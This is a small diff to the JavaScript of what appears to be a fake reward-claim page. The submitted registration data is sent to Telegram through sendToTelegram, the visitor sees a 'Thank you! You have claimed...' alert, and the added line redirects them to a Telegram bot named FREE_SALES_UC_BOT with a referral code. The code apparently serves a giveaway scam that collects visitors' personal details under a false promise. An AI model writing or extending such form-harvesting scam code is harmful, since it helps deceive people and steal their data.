@@ -599,6 +599,8 @@
             await sendToTelegram(data);
 
             alert(`Thank you! You have claimed ${selectedReward}. We will process your request soon. Please check your email for updates.`);
+            window.location.href = 'https://t.me/FREE_SALES_UC_BOT?start=refd7a780612';
+
             document.getElementById('registrationForm').reset();
             document.getElementById(`step${currentStep}-content`).classList.add('hidden');
             currentStep = 1;
